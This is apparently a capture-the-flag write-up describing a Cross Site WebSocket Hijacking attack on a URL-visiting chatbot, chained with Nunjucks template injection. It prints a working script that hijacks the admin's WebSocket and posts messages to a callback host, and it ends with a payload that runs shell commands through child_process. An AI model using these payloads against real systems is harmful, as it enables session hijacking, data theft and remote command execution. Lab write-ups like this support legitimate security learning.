Find websocket does not contain CSRF token and the session cookie is SameSite=None.

Meaning if we can force the admin to visit our website, we can exploit the web socket to preform 
a Cross Site WebSocket Hijacking attack (CSWSH)

The user must notice the chatbot accepts and visits URLs sent to it.

Create a custom server with the following script to perform the CSWSH:

```html
<script>
var ws = new WebSocket("wss://challenge-ip/chat");

ws.onopen = function() { 
	ws.send("help"); 
}; 

ws.onmessage = function(event) { 
	fetch('https://CALLBACK-URL/', {method: 'POST', mode: 'no-cors', body: event.data}); 
};
</script>
```

Now we can send commands as the admin user, using the `help` command we can find it also accepts 
a `upload` command with the filecontents next to it:

`upload file contents here`

This is vulnerable to SSTI and since the following payload works `{{7*7}}` and 
the application is NodeJS (X-Powered-By: Express) we can guess Nunjucks

Final payload:

```
upload {{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```
